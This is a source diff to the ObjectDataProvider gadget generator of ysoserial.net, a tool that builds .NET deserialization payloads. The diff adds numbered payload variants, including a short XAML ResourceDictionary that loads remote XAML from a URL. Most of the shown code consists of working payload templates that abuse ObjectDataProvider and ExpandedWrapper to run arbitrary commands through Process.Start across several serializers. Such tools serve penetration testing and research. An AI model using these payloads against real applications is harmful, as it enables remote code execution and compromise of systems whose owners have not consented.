@@ -8,6 +8,7 @@ using System.Reflection;
 using System.Collections.Specialized;
 using System.Windows;
 using ysoserial.Helpers;
+using NDesk.Options;
 
 /*
  * NOTEs:
@@ -23,14 +24,23 @@ namespace ysoserial.Generators
 {
     class ObjectDataProviderGenerator : GenericGenerator
     {
-        public override string Description()
-        {
-            return "ObjectDataProvider gadget";
-        }
+        private int variant_number = 1; // Default
+        private string xaml_url = "";
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "Xaml", "Xaml2", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer", "DataContractSerializer2", "YamlDotNet < 5.0.0", "FsPickler" };
+            return new List<string> { "Xaml (3)", "Json.Net", "FastJson", "JavaScriptSerializer", "XmlSerializer", "DataContractSerializer (2)", "YamlDotNet < 5.0.0", "FsPickler" };
+        }
+
+        public override OptionSet Options()
+        {
+            OptionSet options = new OptionSet()
+            {
+                {"var|variant=", "Payload variant number where applicable. Choices: 1, 2, or 3 based on formatter.", v => int.TryParse(v, out variant_number) },
+                {"xamlurl=", "This is to create a very short paylaod when affected box can read the target XAML URL e.g. \"http://b8.ee/x\" (can be a file path on a shared drive or the local system). This is used by the 3rd XAML payload which is a ResourceDictionary with the Source parameter. Command parameter will be ignored. The shorter the better!", v => xaml_url = v },
+            };
+
+            return options;
         }
 
         public override string Name()
@@ -43,6 +53,11 @@ namespace ysoserial.Generators
             return "Oleksandr Mirosh and Alvaro Munoz";
         }
 
+        public override string Contributors()
+        {
+            return "Oleksandr Mirosh, Alvaro Munoz, Soroush Dalili";
+        }
+
         public override List<string> Labels()
         {
             return new List<string> { GadgetTypes.NotBridgeNotDerived };
@@ -51,7 +66,7 @@ namespace ysoserial.Generators
         public override object Generate(string formatter, InputArgs inputArgs)
         {
             // NOTE: What is Xaml2? Xaml2 uses ResourceDictionary in addition to just using ObjectDataProvider as in Xaml
-            if (formatter.ToLower().Equals("xaml") || formatter.ToLower().Equals("xaml2"))
+            if (formatter.ToLower().Equals("xaml"))
             {
                 ProcessStartInfo psi = new ProcessStartInfo();
                 
@@ -72,15 +87,30 @@ namespace ysoserial.Generators
 
                 string payload = "";
 
-                if (formatter.ToLower().Equals("xaml2"))
+                if (variant_number == 2)
                 {
                     ResourceDictionary myResourceDictionary = new ResourceDictionary();
                     myResourceDictionary.Add("", odp);
-                    payload = XamlWriter.Save(myResourceDictionary);
+                    //payload = XamlWriter.Save(myResourceDictionary);
+                    payload = SerializersHelper.Xaml_serialize(myResourceDictionary);
+
+                }
+                else if(variant_number == 3)
+                {
+                    if(xaml_url == "")
+                    {
+                        Console.WriteLine("Url parameter was not provided.");
+                        Console.WriteLine("Try 'ysoserial --fullhelp' for more information.");
+                        System.Environment.Exit(-1);
+                    }
+                    
+                    payload = @"<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" Source=""" + xaml_url + @"""/>";
+                    
                 }
                 else
                 {
-                    payload = XamlWriter.Save(odp);
+                    //payload = XamlWriter.Save(odp);
+                    payload = SerializersHelper.Xaml_serialize(odp);
                 }
                 
                 if (inputArgs.Minify)
@@ -95,8 +125,9 @@ namespace ysoserial.Generators
                     {
                         SerializersHelper.Xaml_deserialize(payload);
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
@@ -143,8 +174,9 @@ namespace ysoserial.Generators
                     {
                         SerializersHelper.JsonNet_deserialize(payload);
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
@@ -193,8 +225,9 @@ namespace ysoserial.Generators
                         var instance = JSON.ToObject<Object>(payload);
 
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
@@ -237,8 +270,9 @@ namespace ysoserial.Generators
                     {
                         SerializersHelper.JavaScriptSerializer_deserialize(payload);
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
@@ -285,32 +319,33 @@ namespace ysoserial.Generators
                 {
                     try
                     {
-                        SerializersHelper.XMLSerializer_deserialize(payload, null, "root");
+                        SerializersHelper.XMLSerializer_deserialize(payload, null, "root", "type");
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
             }
-            else if (formatter.ToLower().Equals("datacontractserializer2"))
+            else if (formatter.ToLower().Equals("datacontractserializer"))
             {
-                // This by mixing what we had already in xmlserializer and datacontractserializer
-                // this can be useful to bypass deserializers that are based on a blacklist
                 inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
 
-                String cmdPart;
+                String cmdPart, payload;
 
-                if (inputArgs.HasArguments)
+                if (variant_number == 2)
                 {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
-                }
-                else
-                {
-                    cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
-                }
+                    if (inputArgs.HasArguments)
+                    {
+                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String><b:String>{inputArgs.CmdArguments}</b:String>";
+                    }
+                    else
+                    {
+                        cmdPart = $@"<ObjectDataProvider.MethodParameters><b:String>{inputArgs.CmdFileName}</b:String>";
+                    }
 
-                String payload = $@"<?xml version=""1.0""?>
+                    payload = $@"<?xml version=""1.0""?>
 <root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
     <ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
       <ExpandedElement z:Id=""ref1"" >
@@ -328,40 +363,41 @@ namespace ysoserial.Generators
     </ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW>
 </root>
 ";
-                if (inputArgs.Minify)
-                {
-                    payload = XMLMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
                 }
-
-                if (inputArgs.Test)
+                else if (variant_number == 3)
                 {
-                    try
-                    {
-                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root");
-                    }
-                    catch
-                    {
-                    }
-                }
-                return payload;
-            }
-            else if (formatter.ToLower().Equals("datacontractserializer"))
-            {
-                inputArgs.CmdType = CommandArgSplitter.CommandType.XML;
-
-                String cmdPart;
-
-                if (inputArgs.HasArguments)
-                {
-                    cmdPart = $@"<b:anyType i:type=""c:string"">" + inputArgs.CmdFileName + @"</b:anyType>
-          <b:anyType i:type=""c:string"">" + inputArgs.CmdArguments + "</b:anyType>";
+                    payload = $@"<?xml version=""1.0""?>
+<root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
+    <ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"">
+      <ExpandedElement z:Id=""ref1"" >
+        <__identity xsi:nil=""true"" xmlns=""http://schemas.datacontract.org/2004/07/System""/>
+      </ExpandedElement>
+        <ProjectedProperty0 xmlns:a=""http://schemas.datacontract.org/2004/07/System.Windows.Data"">
+            <a:MethodName>Parse</a:MethodName>
+            <a:MethodParameters>
+                <anyType xsi:type=""xsd:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">
+                    <![CDATA[<ResourceDictionary xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation"" xmlns:d=""http://schemas.microsoft.com/winfx/2006/xaml"" xmlns:b=""clr-namespace:System;assembly=mscorlib"" xmlns:c=""clr-namespace:System.Diagnostics;assembly=system""><ObjectDataProvider d:Key="""" ObjectType=""{{d:Type c:Process}}"" MethodName=""Start"">xxxxx</ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
+                </anyType>
+            </a:MethodParameters>
+            <a:ObjectInstance z:Ref=""ref1""/>
+        </ProjectedProperty0>
+    </ExpandedWrapperOfXamlReaderObjectDataProviderRexb2zZW>
+</root>
+";
                 }
                 else
                 {
-                    cmdPart = $@"<anyType i:type=""c:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">" + inputArgs.CmdFileName + @"</anyType>";
-                }
+                    if (inputArgs.HasArguments)
+                    {
+                        cmdPart = $@"<b:anyType i:type=""c:string"">" + inputArgs.CmdFileName + @"</b:anyType>
+          <b:anyType i:type=""c:string"">" + inputArgs.CmdArguments + "</b:anyType>";
+                    }
+                    else
+                    {
+                        cmdPart = $@"<anyType i:type=""c:string"" xmlns=""http://schemas.microsoft.com/2003/10/Serialization/Arrays"">" + inputArgs.CmdFileName + @"</anyType>";
+                    }
 
-                String payload = $@"<?xml version=""1.0""?>
+                    payload = $@"<?xml version=""1.0""?>
 <root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
     <ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL xmlns=""http://schemas.datacontract.org/2004/07/System.Data.Services.Internal"" 
                                                          xmlns:c=""http://www.w3.org/2001/XMLSchema""
@@ -381,6 +417,7 @@ namespace ysoserial.Generators
     </ExpandedWrapperOfProcessObjectDataProviderpaO_SOqJL>
 </root>
 ";
+                }
                 if (inputArgs.Minify)
                 {
                     payload = XMLMinifier.Minify(payload, null, null, FormatterType.DataContractXML, true);
@@ -390,10 +427,11 @@ namespace ysoserial.Generators
                 {
                     try
                     {
-                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root");
+                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
@@ -438,8 +476,9 @@ namespace ysoserial.Generators
                     {
                         SerializersHelper.YamlDotNet_deserialize(payload);
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
@@ -511,8 +550,9 @@ namespace ysoserial.Generators
                         var serializer = MBrace.CsPickler.CsPickler.CreateJsonSerializer(true);
                         serializer.UnPickleOfString<Object>(payload);
                     }
-                    catch
+                    catch (Exception err)
                     {
+                        Debugging.ShowErrors(inputArgs, err);
                     }
                 }
                 return payload;
